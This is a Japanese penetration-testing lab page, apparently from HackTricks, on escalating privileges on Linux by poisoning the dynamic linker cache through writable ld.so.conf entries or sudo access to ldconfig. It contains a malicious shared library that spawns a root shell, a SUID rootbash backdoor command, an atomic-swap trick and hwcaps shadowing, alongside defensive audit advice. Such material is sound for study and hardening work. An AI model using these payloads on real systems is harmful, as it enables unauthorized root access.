# ld.so privesc exploit の例

{{#include ../../banners/hacktricks-training.md}}

このページは、**`/etc/ld.so.conf` または `ldconfig` を介した system linker cache の poisoning** に焦点を当てた lab です。missing-library injection、書き込み可能な `RPATH`/`RUNPATH`、`LD_PRELOAD`、その他の一般的な SUID linker abuse については、[SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md) を参照してください。

## 環境の準備

次のセクションには、環境の準備に使用するファイルの code があります。

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. 同じフォルダ内にこれらのファイルを**作成**します
2. **library**を**コンパイル**します: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so`を`/usr/lib`に**コピー**してキャッシュを更新します: `sudo cp libcustom.so /usr/lib && sudo ldconfig`（root privs）
4. **executable**を**コンパイル**します: `gcc sharedvuln.c -o sharedvuln -lcustom`

### 環境の確認

_libcustom.so_が_/usr/lib_から**ロード**され、バイナリを**実行**できることを確認します。
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Useful triage commands

実際の target を攻撃する際は、binary が必要とする **exact library name**、loader が**現在 resolve している対象**、そして live cache を変更せずに書き込み可能な設定済みの path を確認します。<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
`ldd` は **trusted** な実行ファイルに対してのみ使用してください。一部の実装や通常とは異なる ELF interpreter では、attacker-controlled code が実行される可能性があります。`objdump -p ./file | grep NEEDED` を使えば、直接の依存関係を安全に一覧表示できます。trusted target では、検出した interpreter を `--list` とともに実行すると、実際の解決結果を確認できます。その出力を `--inhibit-cache --list` と比較してください。差異があれば、通常の search-path rule ではなく `/etc/ld.so.cache` によって object が選択されたことが証明されます。<sup>[[1]](#references)[[4]](#references)</sup>

いくつかの有用な注意点:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` は通常 **機能しません**。リダイレクトは現在の shell によって実行されるためです。代わりに
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` を使用してください。
- **SUID/privileged** binary は **secure-execution mode** で実行されます。`LD_LIBRARY_PATH`
は無視され、`LD_PRELOAD` には制限があります（slash を含む名前は無視され、standard directory にある setuid-marked library のみ preload できます）。root が `ldconfig` を実行すると、`/etc/ld.so.conf` に記載された directory が `/etc/ld.so.cache` に入る可能性があるため、この misconfiguration は依然として privileged program に影響を与えることがあります。<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` も secure-execution mode では無視されます。ただし `/etc/suid-debug` が存在する場合を除きます。そのため、privileged execution からの出力を期待するのではなく、同等の non-SUID run から trace を収集してください。<sup>[[1]](#references)</sup>
- glibc 2.33 以降では、dynamic loader は `--list-diagnostics` も提供します。これは、hijack が期待どおりに動作しない場合に、machine-readable な loader diagnostics と built-in search-path information を出力します。<sup>[[1]](#references)[[6]](#references)</sup>

### Cache と SONAME の制約

`ldconfig` は configured directory 内の任意の file をすべて cache するわけではありません。ELF header を調べ、`lib*.so*` または `ld-*.so*` に一致する名前を認識し、一般的な `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12` chain を想定します。したがって injected object には target の architecture/class、正確な `DT_NEEDED` name（通常はその `DT_SONAME`）、および victim が resolve するすべての symbol/version が必要です。<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
この例のように、target-specific libraryを優先してください。不完全なオブジェクトで一般的なSONAMEをshadowすると、意図したprivileged targetが実行される前にそのSONAMEを解決するすべてのプロセスが壊れる可能性があります。<sup>[[3]](#references)</sup>

### キャッシュパスの永続化とatomic swap

キャッシュには**library nameからpathnameへの**マッピングが記録されます。shared object自体が埋め込まれるわけではありません。攻撃者が制御するpathnameがキャッシュされた後、その正確なパスにあるオブジェクトを置き換えると、別途`ldconfig`を実行しなくても、新しく起動したプロセスに影響を与えられます。これにより、便利なtime-of-check/time-of-useパターンが可能になります。管理者によるキャッシュの再構築または検査中には有効なlibraryを公開し、その後payloadを対象の上にatomic renameします。既存のプロセスでは、すでにマッピングされたオブジェクトが保持されます。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
同様に、`ld.so.conf` から悪意のある行を削除しても、すでに書き込まれたエントリがそれだけで排除されるわけではありません。管理者は、信頼できないオブジェクトを削除し、所有者と書き込みアクセスを修正して、キャッシュを再構築する必要があります。上記の `--inhibit-cache` による比較を使用して、古いキャッシュエントリと、現在も有効な設定パスを区別してください。<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

このシナリオでは、管理者が、システムの
`/etc/ld.so.conf` によって include される `/etc/ld.so.conf.d/` 配下の
ファイルに、脆弱なエントリを追加したとします。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
脆弱なフォルダーは _/home/ubuntu/lib_ です（書き込みアクセスが可能です）。\
そのパス内で以下のコードを**Download and compile**してください：
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
後で **root**（または別の特権アカウント）が脆弱なバイナリを実行すると予想される場合は、通常、インタラクティブシェルを起動するよりも、**root** 所有のアーティファクトを残しておく方が適切です。例：
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
その後、特権実行が行われたら、`/tmp/rootbash -p` を使用できます。

**誤設定された**パス内に悪意のある libcustom ライブラリを**作成した**ので、デフォルトのキャッシュは、特権的な **`ldconfig`** の実行が成功して再構築される必要があります。再起動が有効なのは、ローカルの boot process が実際に `ldconfig` を呼び出す場合だけです。それ以外の場合は、管理者による操作を待つか、利用可能であれば安全でない sudo ルールを使用します。<sup>[[2]](#references)</sup>

これが完了したら、`sharedvuln` executable が `libcustom.so` library をどこからロードしているかを**再確認**します：
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
ご覧のとおり、**`/home/ubuntu/lib` からロード**しており、いずれかのユーザーがこれを実行すると、shell が実行されます。
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> この例ではまだ権限昇格を行っていない点に注意してください。ただし、実行されるコマンドを変更し、**root またはその他の特権ユーザーが脆弱なバイナリを実行するのを待つ**ことで、権限を昇格できます。

### Modern `glibc-hwcaps` shadowing

glibc 2.33 以降、loader は **すべての library search directory** 内にある `glibc-hwcaps/<level>/` 以下の最適化されたライブラリを優先できます。そのため、`/home/ubuntu/lib` だけを確認するのは不十分です。`/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/` のような書き込み可能な互換サブディレクトリは、`ldconfig` がインデックス化した後に base library を shadowing できます。一方、その他の CPU では base object が引き続き使用されます。これにより、別の CPU 上で validation が行われた場合に見逃される可能性がある、architecture-selective な hijack も実現できます。<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
現在の glibc hardening guidance では、重複する SONAME、non-default の search location、および `glibc-hwcaps` サブディレクトリ内の object を避けることが推奨されています。audit の観点では、設定されたディレクトリとその親パス component に対して、ownership と writeability のチェックを再帰的に適用してください。<sup>[[3]](#references)</sup>

### その他の misconfigurations - Same vuln

前の例では、administrator が **`/etc/ld.so.conf.d/` 内の configuration file に non-privileged folder を設定した** という misconfiguration を作り出しました。\
しかし、同じ vulnerability を引き起こす可能性がある misconfiguration は他にもあります。読み込まれる **config file** に対する **write permissions** がある場合、writable な `/etc/ld.so.conf.d/` directory 内に file を作成できる場合、または `/etc/ld.so.conf` に書き込める場合、同じ vulnerability を設定して exploit できます。<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**`ldconfig` に対する sudo privileges があるとします**。`ldconfig` は scan directories を positional arguments として受け取るため、cache-poisoning の最短形式は、多くの場合、単純に次のようになります。<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
また、`-f` を使うと、デフォルトの cache output を維持したまま別の configuration file を選択できます。これは、argument filter によって位置引数の directories がブロックされていても `-f` は許可される場合や、複数の paths を注入する必要がある場合に便利です。<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
ここで、**previous exploit** で示したように、**悪意のあるライブラリを `/tmp` 内に作成**します。\
そして最後に、パスを読み込んで、バイナリがライブラリをどこから読み込んでいるかを確認します:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**ご覧のとおり、`ldconfig` に対する sudo 権限があれば、同じ脆弱性を exploit できます。** 制限された sudo rule を評価する際は、オプションの詳細が重要です。`-f` は別の設定を選択しますが、それでも `/etc/ld.so.cache` を再構築します。`-C` は cache の出力先を別の場所に変更します。`-N` は cache の再構築を無効にします。`-X` は link の更新を無効にしますが、**`-N` と組み合わせない限り cache は再構築します**。`-n` は `-N` を意味するため、指定されたディレクトリ内の link は更新できますが、cache に poison することはできません。`-r` は別の root 以下で動作し、通常はホストの cache を変更しません。<sup>[[2]](#references)</sup>

## glibc 2.44: cache された system-wide tunables

glibc 2.44 以降、`ldconfig` は `/etc/tunables.conf` も解析し、その設定を `/etc/ld.so.cache` の拡張として保存します。このファイルは `include` directives と process ごとの filters を受け付けます。prefix によって scope を制御します。`@` は `AT_SECURE` process のみを対象にし、`$` はそれらを除外し、`*` は両方を対象にします。これにより、audit boundary は library directory の範囲を超えて広がります。書き込み可能な tunables 設定、またはそれに含まれるファイルは、privileged な cache rebuild 後に起動するプログラムへ影響を与える可能性があります。<sup>[[7]](#references)</sup>

同じ release では `ldconfig -t TUNCONF` も追加されました。これは別の tunables file を選択しますが、別のオプションで変更しない限り、通常の cache には引き続き書き込みます。そのため、`-f` のみを block しようとした wrapper や sudo rule では不十分であり、`-t`、任意の positional directory、cache output の操作も拒否する必要があります。<sup>[[7]](#references)[[8]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
これは自動的な任意コード実行ではありません。これは特権的な **loader-behavior manipulation** プリミティブです。glibc は、システム全体に適用される値によって、個々の tunable に対するセキュリティ審査なしに、セキュリティに関わる tunable が setuid/setgid プログラムへ適用される可能性があると明示的に警告しています。`--list-tunables` を使ってホスト上の実際の tunable を列挙し、普遍的な payload を想定するのではなく、対象固有の allocator の変更、CPU-hardening の変更、または denial-of-service 状態を探してください。<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - Linux マニュアルページ](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux マニュアルページ](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Dynamic Linker Hardening - GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux マニュアルページ](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Dynamic Linker Diagnostics (GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [System-wide Tunables (GNU C Library 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Add system-wide tunables: ldconfig part (patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
{{#include ../../banners/hacktricks-training.md}}
